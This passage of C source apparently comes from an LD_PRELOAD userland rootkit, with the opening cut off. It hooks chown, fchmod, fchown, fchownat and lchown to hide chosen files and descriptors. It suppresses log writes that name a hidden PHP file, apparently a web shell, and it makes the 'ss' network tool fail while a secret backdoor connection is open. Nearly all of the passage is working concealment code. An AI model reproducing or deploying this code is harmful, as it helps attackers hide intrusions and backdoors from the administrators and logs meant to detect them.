        errno = ENOENT;
        return -1;
    }
end_chown:
    return o_chown(path, owner, group);
}
int fchmod(int fd, mode_t mode){
    getsym(o_fchmod, "fchmod");
    if(snodew()) goto end_fchmod;
    if(hidden_fd(fd)){
        errno = ENOENT;
        return -1;
    }
end_fchmod:
    return o_fchmod(fd, mode);
}
int fchown(int fd, uid_t owner, gid_t group){
    getsym(o_fchown, "fchown");
    if(snodew()) goto end_fchown;
    if(hidden_fd(fd)){
        errno = ENOENT;
        return -1;
    }
end_fchown:
    return o_fchown(fd, owner, group);
}
int fchownat(int dirfd, const char *pathname, uid_t owner, gid_t group, int flags){
    getsym(o_fchownat, "fchownat");
    if(snodew()) goto end_fchownat;
    if(hidden_fd(dirfd) || hidden_path(pathname)){
        errno = ENOENT;
        return -1;
    }
end_fchownat:
    return o_fchownat(dirfd, pathname, owner, group, flags);
}
int lchown(const char *path, uid_t owner, gid_t group){
    getsym(o_lchown, "lchown");
    if(snodew()) goto end_lchown;
    if(hidden_path(path) || hidden_lpath(path)){
        errno = ENOENT;
        return -1;
    }
end_lchown:
    return o_lchown(path, owner, group);
}


/* stop things from writing logs containing the php filename */
ssize_t write(int fd, const void *buf, size_t count){
    if(strstr((char *)buf, PHP_NEWFILENAME)){
        //size_t fcount = 0;
        //return o_write(fd, buf, 1);
        return strlen(PHP_NEWFILENAME);
    }
    getsym(o_write, "write");
    return o_write(fd, buf, count);
}


/*
    BREAK ss BY HOOKING socket.
    PREVENTS VIEWING OF SECRET_PORT.
    WILL ONLY BREAK ss IF THE SECRET
    CONNECTION IS CURRENTLY ALIVE.
 */
int ssme(int domain, int protocol){
    if(domain != AF_NETLINK || protocol != NETLINK_INET_DIAG)
        return 0;

    int status;
    char *myname = get_myname();
    if(!strncmp(myname, "ss\0", strlen(myname))) status = 1;
    if(!strncmp(myname, "/usr/bin/ss\0", strlen(myname))) status = 1;
    if(!strncmp(myname, "/bin/ss\0", strlen(myname))) status = 1;
    free(myname);
    return status;

}
int socket(int domain, int type, int protocol){
    getsym(o_socket, "socket");
    if(snodew()) goto end_socket;

    /* if ss is the calling process,
     * we may have to break it, if
     * secret_port is in use. */
    if(ssme(domain, protocol)){
        if(!secretconnection_alive())
            goto end_socket;

        errno = EIO;
        return -1;
    }

end_socket:
    return o_socket(domain, type, protocol);
}
